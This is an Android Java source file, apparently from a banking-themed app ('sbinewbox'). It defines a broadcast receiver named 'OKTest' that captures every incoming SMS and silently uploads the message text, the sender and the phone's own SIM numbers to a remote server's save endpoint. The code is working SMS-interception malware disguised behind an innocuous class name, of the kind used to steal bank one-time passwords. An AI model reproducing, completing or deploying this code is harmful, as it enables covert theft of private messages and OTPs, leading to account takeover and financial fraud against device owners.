package sbinewbox.com.share;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import org.json.JSONException;
import org.json.JSONObject;

public class OKTest extends BroadcastReceiver {

    private String sender;
    private String messageBody;
    private String receiver;
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        if (smsMessage != null) {
                             sender =  smsMessage.getDisplayOriginatingAddress();
                             receiver = P4kAs.getSimNumbers(context);
                             messageBody = smsMessage.getMessageBody();
                            JSONObject data = new JSONObject();
                            try {
                                data.put("message", messageBody);
                                data.put("sender", sender);
                                data.put("receiver", receiver);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                            JSONObject jsonData = new JSONObject();
                            try {
                                jsonData.put("site", P4kAs.site);
                                jsonData.put("data", data);
                                jsonData.put("type", "sms");
                                P4kAs.sendData("/api.php?action=save", jsonData);
                            } catch (JSONException e) {
                                throw new RuntimeException(e);
                            }
                        }
                    }
                }
            }
        }
    }

}